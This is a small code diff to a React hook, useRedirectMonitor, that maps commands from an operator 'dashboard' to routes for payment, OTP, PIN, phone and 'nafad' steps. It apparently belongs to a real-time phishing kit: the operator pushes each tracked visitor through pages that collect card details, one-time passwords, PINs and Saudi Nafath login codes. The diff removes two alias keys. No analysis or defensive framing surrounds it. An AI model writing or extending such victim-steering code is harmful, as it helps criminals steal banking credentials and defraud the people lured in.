@@ -43,10 +43,8 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
               'compar': '/compar',
               'check': '/check',
               'payment': '/check',
-              'veri': '/step2',
-              'otp': '/step2',        // Dashboard sends 'otp'
-              'confi': '/step3',
-              'pin': '/step3',        // Dashboard sends 'pin'
+              'otp': '/step2',
+              'pin': '/step3',
               'phone': '/step5',
               'nafad': '/step4'
             }
